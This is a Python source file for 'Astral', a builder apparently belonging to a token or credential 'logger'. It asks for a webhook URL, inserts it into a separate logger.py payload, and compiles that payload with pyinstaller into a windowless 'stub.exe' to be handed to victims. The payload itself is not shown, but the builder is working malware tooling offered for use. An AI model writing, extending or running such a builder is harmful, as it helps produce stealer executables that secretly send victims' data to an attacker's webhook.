from colorama import Fore, Style, init
from os import system, getenv, remove
from shutil import rmtree, copy2
from os.path import join, exists
from random import choice
from string import ascii_letters


class AstralBuilder:
    def showLogo(self):
        print(f"""{Fore.MAGENTA}
 █████╗ ███████╗████████╗██████╗  █████╗ ██╗
██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║
███████║███████╗   ██║   ██████╔╝███████║██║
██╔══██║╚════██║   ██║   ██╔══██╗██╔══██║██║
██║  ██║███████║   ██║   ██║  ██║██║  ██║███████╗
╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
Made by flow#0333 || Github: https://github.com/nickdev2/astral-logger
Version 1.0
{Fore.WHITE}{Style.BRIGHT}
""".replace("█", f"{Fore.WHITE}█{Fore.MAGENTA}"))

    def buildStub(self):
        sourceFile = open("./src/logger.py", "r")
        sourceCode = sourceFile.read()
        updatedSourceCode = sourceCode.replace("%WEBHOOK_URL%", self.webhook)

        sourceFile.close()

        buildID = "".join(
            choice(ascii_letters) for x in range(8))
        buildPath = join(self.TEMP, buildID)
        buildFile = open(buildPath, "w")
        buildFile.write(updatedSourceCode)
        buildFile.close()

        system(f"pyinstaller --onefile --noconsole {buildPath}")

        if (exists("stub.exe")):
            remove("stub.exe")

        copy2(f"./dist/{buildID}.exe", "stub.exe")
        rmtree("dist")
        rmtree("build")
        remove(f"{buildID}.spec")
        system("cls")
        print("Built stub! Press enter to build another.")
        input()

    def buildPrompt(self):
        system("cls")

        self.showLogo()
        self.webhook = input(
            f"[ASTRAL] Webhook URL {Fore.MAGENTA}> {Fore.WHITE}")
        self.buildStub()

    def __init__(self):
        init()
        system("title Astral")

        self.TEMP = getenv("TEMP")

        while True:
            self.buildPrompt()


AstralBuilder()
